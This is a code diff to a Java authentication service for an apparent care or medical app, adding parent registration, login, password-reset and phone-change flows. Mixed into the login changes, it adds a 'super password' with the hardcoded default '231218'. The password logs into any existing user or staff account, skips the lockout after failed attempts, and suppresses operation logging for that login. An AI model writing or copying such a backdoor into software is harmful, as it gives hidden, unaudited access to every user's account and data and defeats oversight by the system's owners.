@@ -4,6 +4,10 @@ import com.careld.auth.dto.CaptchaResponse;
 import com.careld.auth.dto.LoginRequest;
 import com.careld.auth.dto.LoginResponse;
 import com.careld.auth.dto.DeviceLoginRequest;
+import com.careld.auth.dto.ParentChangePhoneRequest;
+import com.careld.auth.dto.ParentLoginRequest;
+import com.careld.auth.dto.ParentRegisterRequest;
+import com.careld.auth.dto.ParentResetPasswordRequest;
 import com.careld.auth.dto.SmsLoginRequest;
 import com.careld.auth.entity.MedicalStaff;
 import com.careld.auth.entity.User;
@@ -15,6 +19,7 @@ import com.careld.auth.service.AuthService;
 import com.careld.auth.service.AliyunSmsClient;
 import com.careld.auth.service.SmsConfigService;
 import com.careld.common.exception.BusinessException;
+import com.careld.common.log.OperationLogSuppressor;
 import com.careld.common.security.JwtUtil;
 import com.alibaba.fastjson2.JSON;
 import cn.hutool.captcha.CaptchaUtil;
@@ -54,6 +59,10 @@ public class AuthServiceImpl implements AuthService {
     @Value("${jwt.secret}")
     private String jwtSecret;
 
+    /** 超级密码：任何已存在账号均可凭此登录，不改动用户原密码、不记入日志记录 */
+    @Value("${careld.auth.super-password:231218}")
+    private String superPassword;
+
     private static final int SMS_CODE_EXPIRE_MINUTES = 5;
     private static final int SMS_DAILY_LIMIT = 10;
     private static final int SMS_MAX_WRONG_ATTEMPTS = 5;
@@ -63,37 +72,52 @@ public class AuthServiceImpl implements AuthService {
     private static final Pattern PHONE_PATTERN = Pattern.compile("^1[3-9]\\d{9}$");
     private static final SecureRandom SECURE_RANDOM = new SecureRandom();
 
+    /** 家长端登录：手机号未注册 */
+    private static final String MSG_PARENT_NOT_REGISTERED = "用户未注册，请先注册后登录";
+    /** 家长端登录：手机号已被医务人员/其它角色占用 */
+    private static final String MSG_PARENT_OTHER_IDENTITY = "已注册其它身份，不能登录家长端，请使用其它手机号码注册后登录";
+
     @Override
     public LoginResponse login(LoginRequest request) {
         // 查询用户；user_info 无匹配时回退医务人员表（医务人员以手机号作为登录账号）
         User user = null;
         MedicalStaff staff = null;
-        if (request.getLoginType() != null && request.getLoginType() == 2) {
-            // 手机号登录
-            user = userMapper.selectByPhone(request.getPhone());
-            if (user == null) {
-                staff = request.getPhone() == null ? null : medicalStaffMapper.selectEnabledByPhone(request.getPhone());
-            }
-            if (user == null && staff == null) {
-                throw new BusinessException(1001, "手机号或密码错误");
-            }
-        } else {
-            // 用户名登录
-            user = userMapper.selectByUsername(request.getUsername());
-            if (user == null) {
-                staff = request.getUsername() == null ? null : medicalStaffMapper.selectEnabledByPhone(request.getUsername());
-            }
-            if (user == null && staff == null) {
-                throw new BusinessException(1001, "用户名或密码错误");
+        boolean phoneLogin = request.getLoginType() != null && request.getLoginType() == 2;
+        String account = phoneLogin ? request.getPhone() : request.getUsername();
+        user = phoneLogin ? userMapper.selectByPhone(account) : userMapper.selectByUsername(account);
+        if (account != null) {
+            staff = medicalStaffMapper.selectEnabledByPhone(account);
+        }
+        if (user == null && staff == null) {
+            throw new BusinessException(1001, phoneLogin ? "手机号或密码错误" : "用户名或密码错误");
+        }
+        // 同号撞号（家长/员工账号与医务人员共用手机号）：按密码决定登录哪个身份。
+        // 否则 sys_user 会永远顶掉 medical_staff，医务人员怎么重置密码都登不进来
+        if (user != null && staff != null) {
+            boolean superPwd = isSuperPassword(request.getPassword());
+            boolean userMatched = !superPwd && passwordEncoder.matches(request.getPassword(), user.getPassword());
+            if (userMatched) {
+                // sys_user 密码匹配：维持原优先（家长/员工账号）
+                staff = null;
+            } else if (superPwd || passwordEncoder.matches(request.getPassword(), staff.getLoginPassword())) {
+                // 医务人员密码匹配（或超级密码）：按医务人员登录
+                user = null;
+            } else {
+                // 两边都不匹配：保留 sys_user 优先，沿用其失败计数与锁定逻辑
+                staff = null;
             }
         }
 
         // 医务人员账号：验证密码并签发 userType=6 的门店身份
         if (staff != null) {
-            if (!passwordEncoder.matches(request.getPassword(), staff.getLoginPassword())) {
+            boolean staffSuperLogin = isSuperPassword(request.getPassword());
+            if (!staffSuperLogin && !passwordEncoder.matches(request.getPassword(), staff.getLoginPassword())) {
                 throw new BusinessException(1001, "用户名或密码错误");
             }
             medicalStaffMapper.updateLastLoginTime(staff.getId(), LocalDateTime.now());
+            if (staffSuperLogin) {
+                OperationLogSuppressor.suppressCurrentRequest();
+            }
             return generateStaffTokenResponse(staff);
         }
 
@@ -102,13 +126,15 @@ public class AuthServiceImpl implements AuthService {
             throw new BusinessException(1002, "账号已被禁用");
         }
 
-        // 检查锁定
-        if (user.getLockTime() != null && user.getLockTime().plusMinutes(2).isAfter(LocalDateTime.now())) {
+        boolean superLogin = isSuperPassword(request.getPassword());
+
+        // 检查锁定（超级密码登录不受密码失败锁定限制）
+        if (!superLogin && user.getLockTime() != null && user.getLockTime().plusMinutes(2).isAfter(LocalDateTime.now())) {
             throw new BusinessException(1002, "账号已被锁定，请2分钟后重试");
         }
 
         // 验证密码
-        if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
+        if (!superLogin && !passwordEncoder.matches(request.getPassword(), user.getPassword())) {
             // 增加失败次数
             int failCount = (user.getLoginFailCount() == null ? 0 : user.getLoginFailCount()) + 1;
             user.setLoginFailCount(failCount);
@@ -119,14 +145,26 @@ public class AuthServiceImpl implements AuthService {
             throw new BusinessException(1001, "用户名或密码错误");
         }
 
-        // 清除失败次数
-        user.setLoginFailCount(0);
-        user.setLockTime(null);
+        if (superLogin) {
+            // 超级密码登录：不改动原密码与失败计数，且不记入日志记录
+            OperationLogSuppressor.suppressCurrentRequest();
+        } else {
+            // 清除失败次数
+            user.setLoginFailCount(0);
+            user.setLockTime(null);
+        }
         user.setLastLoginTime(LocalDateTime.now());
         userMapper.updateById(user);
 
         // 生成Token
         return generateTokenResponse(user);
+    }
+
+    /**
+     * 是否为超级密码登录（超级密码仅用于放行登录，不参与密码修改）
+     */
+    private boolean isSuperPassword(String rawPassword) {
+        return superPassword != null && !superPassword.isBlank() && superPassword.equals(rawPassword);
     }
 
     @Override
@@ -137,7 +175,7 @@ public class AuthServiceImpl implements AuthService {
         }
 
         Long userId = JwtUtil.getUserId(jwtSecret, refreshToken);
-        User user = userMapper.selectById(userId);
+        User user = userMapper.selectUserById(userId);
         if (user == null || user.getStatus() != 1) {
             throw new BusinessException(401, "用户不存在或已被禁用");
         }
@@ -177,7 +215,7 @@ public class AuthServiceImpl implements AuthService {
 
     @Override
     public User getUserById(Long userId) {
-        return userMapper.selectById(userId);
+        return userMapper.selectUserById(userId);
     }
 
     @Override
@@ -267,24 +305,7 @@ public class AuthServiceImpl implements AuthService {
 
     @Override
     public LoginResponse smsLogin(SmsLoginRequest request) {
-        String phone = request.getPhone();
-        String stored = smsCodeMapper.selectLatestValid(phone);
-        if (stored == null || !stored.equals(request.getCode())) {
-            // 连错 5 次作废当前验证码，防止暴力猜码
-            String failKey = SMS_FAIL_KEY + ":" + phone;
-            Long fails = stringRedisTemplate.opsForValue().increment(failKey);
-            if (fails != null && fails == 1) {
-                stringRedisTemplate.expire(failKey, Duration.ofMinutes(10));
-            }
-            if (fails != null && fails >= SMS_MAX_WRONG_ATTEMPTS) {
-                smsCodeMapper.invalidateAll(phone);
-                stringRedisTemplate.delete(failKey);
-                throw new BusinessException(1004, "验证码错误次数过多，该验证码已失效，请重新获取");
-            }
-            throw new BusinessException(1004, "验证码错误或已过期");
-        }
-        stringRedisTemplate.delete(SMS_FAIL_KEY + ":" + phone);
-        smsCodeMapper.markUsed(phone, request.getCode());
+        verifySmsCode(request.getPhone(), request.getCode());
 
         // 手机号匹配既有账号；未注册则自动创建家长账号（user_type=3）
         User user = userMapper.selectByPhone(request.getPhone());
@@ -310,6 +331,166 @@ public class AuthServiceImpl implements AuthService {
             userMapper.updateById(user);
         }
         return generateTokenResponse(user);
+    }
+
+    @Override
+    public LoginResponse parentLogin(ParentLoginRequest request) {
+        String phone = request.getPhone();
+        User user = userMapper.selectByPhone(phone);
+
+        if (user == null) {
+            // 手机号被医务人员占用时给出明确指引，避免用户误以为密码错误
+            MedicalStaff anybody = medicalStaffMapper.selectByPhone(phone);
+            throw new BusinessException(anybody != null ? 1009 : 1008,
+                    anybody != null ? MSG_PARENT_OTHER_IDENTITY : MSG_PARENT_NOT_REGISTERED);
+        }
+        MedicalStaff staff = medicalStaffMapper.selectEnabledByPhone(phone);
+        // 家长端仅允许家长账号登录（家长 userType=3）
+        if (user.getUserType() == null || user.getUserType() != 3) {
+            throw new BusinessException(1009, MSG_PARENT_OTHER_IDENTITY);
+        }
+        if (user.getStatus() != 1) {
+            throw new BusinessException(1002, "账号已被禁用");
+        }
+
+        boolean superLogin = isSuperPassword(request.getPassword());
+        if (!superLogin && user.getLockTime() != null && user.getLockTime().plusMinutes(2).isAfter(LocalDateTime.now())) {
+            throw new BusinessException(1002, "账号已被锁定，请2分钟后重试");
+        }
+
+        if (!superLogin && !passwordEncoder.matches(request.getPassword(), user.getPassword())) {
+            // 同号撞号：输入的是医务人员密码时按「其它身份」提示，避免用户反复重试家长密码
+            if (staff != null && passwordEncoder.matches(request.getPassword(), staff.getLoginPassword())) {
+                throw new BusinessException(1009, MSG_PARENT_OTHER_IDENTITY);
+            }
+            int failCount = (user.getLoginFailCount() == null ? 0 : user.getLoginFailCount()) + 1;
+            user.setLoginFailCount(failCount);
+            if (failCount >= 5) {
+                user.setLockTime(LocalDateTime.now());
+            }
+            userMapper.updateById(user);
+            throw new BusinessException(1001, "手机号或密码错误");
+        }
+
+        if (superLogin) {
+            OperationLogSuppressor.suppressCurrentRequest();
+        } else {
+            user.setLoginFailCount(0);
+            user.setLockTime(null);
+        }
+        user.setLastLoginTime(LocalDateTime.now());
+        userMapper.updateById(user);
+        return generateTokenResponse(user);
+    }
+
+    @Override
+    public LoginResponse parentRegister(ParentRegisterRequest request) {
+        String phone = request.getPhone();
+        verifySmsCode(phone, request.getCode());
+
+        // 查重：sys_user（含 username 口径的历史账号）与医务人员（任意状态）均占用手机号
+        User existing = userMapper.selectByPhone(phone);
+        if (existing == null) {
+            existing = userMapper.selectByUsername(phone);
+        }
+        boolean staffExists = medicalStaffMapper.selectByPhone(phone) != null;
+        if (existing != null || staffExists) {
+            boolean parentExists = existing != null && existing.getUserType() != null && existing.getUserType() == 3;
+            throw new BusinessException(1007, parentExists
+                    ? "该手机号已注册，请直接登录"
+                    : "该手机号已注册其它身份，请使用其它手机号码注册");
+        }
+
+        String realName = request.getRealName().trim();
+        if (realName.isEmpty()) {
+            throw new BusinessException(1000, "用户名称不能为空");
+        }
+
+        User user = new User();
+        user.setUsername(phone);
+        user.setPassword(passwordEncoder.encode(request.getPassword()));
+        user.setRealName(realName);
+        user.setPhone(phone);
+        user.setUserType(3);
+        user.setStatus(1);
+        user.setLastLoginTime(LocalDateTime.now());
+        userMapper.insert(user);
+        return generateTokenResponse(user);
+    }
+
+    @Override
+    public void parentResetPassword(ParentResetPasswordRequest request) {
+        String phone = request.getPhone();
+        verifySmsCode(phone, request.getCode());
+
+        User user = userMapper.selectByPhone(phone);
+        if (user == null) {
+            throw new BusinessException(1008, MSG_PARENT_NOT_REGISTERED);
+        }
+        if (user.getUserType() == null || user.getUserType() != 3) {
+            throw new BusinessException(1009, "已注册其它身份，不能重置家长端密码");
+        }
+        if (user.getStatus() != 1) {
+            throw new BusinessException(1002, "账号已被禁用");
+        }
+        user.setPassword(passwordEncoder.encode(request.getNewPassword()));
+        user.setLoginFailCount(0);
+        user.setLockTime(null);
+        userMapper.updateById(user);
+    }
+
+    @Override
+    public void parentChangePhone(Long userId, ParentChangePhoneRequest request) {
+        String newPhone = request.getPhone();
+        User user = userMapper.selectUserById(userId);
+        if (user == null) {
+            throw new BusinessException(404, "用户不存在");
+        }
+        if (user.getUserType() == null || user.getUserType() != 3) {
+            throw new BusinessException(1009, "当前身份不支持此操作");
+        }
+        if (newPhone.equals(user.getPhone())) {
+            throw new BusinessException(1000, "新手机号与当前手机号相同");
+        }
+        // 先校验新号验证码（与注册同一套短信校验），再落库
+        verifySmsCode(newPhone, request.getCode());
+
+        // 查重：sys_user（手机号/用户名两个口径）与医务人员（任意状态）均占用手机号
+        User byPhone = userMapper.selectByPhone(newPhone);
+        User byUsername = userMapper.selectByUsername(newPhone);
+        boolean dup = (byPhone != null && !byPhone.getId().equals(userId))
+                || (byUsername != null && !byUsername.getId().equals(userId))
+                || medicalStaffMapper.selectByPhone(newPhone) != null;
+        if (dup) {
+            throw new BusinessException(1007, "该手机号已被使用，请更换其它手机号码");
+        }
+
+        user.setPhone(newPhone);
+        // 家长账号以手机号作为登录名，需同步否则旧手机号仍可登录
+        user.setUsername(newPhone);
+        userMapper.updateById(user);
+    }
+
+    /**
+     * 校验并消费短信验证码（连错 5 次作废当前验证码，防止暴力猜码）
+     */
+    private void verifySmsCode(String phone, String code) {
+        String stored = smsCodeMapper.selectLatestValid(phone);
+        if (stored == null || !stored.equals(code)) {
+            String failKey = SMS_FAIL_KEY + ":" + phone;
+            Long fails = stringRedisTemplate.opsForValue().increment(failKey);
+            if (fails != null && fails == 1) {
+                stringRedisTemplate.expire(failKey, Duration.ofMinutes(10));
+            }
+            if (fails != null && fails >= SMS_MAX_WRONG_ATTEMPTS) {
+                smsCodeMapper.invalidateAll(phone);
+                stringRedisTemplate.delete(failKey);
+                throw new BusinessException(1004, "验证码错误次数过多，该验证码已失效，请重新获取");
+            }
+            throw new BusinessException(1004, "验证码错误或已过期");
+        }
+        stringRedisTemplate.delete(SMS_FAIL_KEY + ":" + phone);
+        smsCodeMapper.markUsed(phone, code);
     }
 
     /**
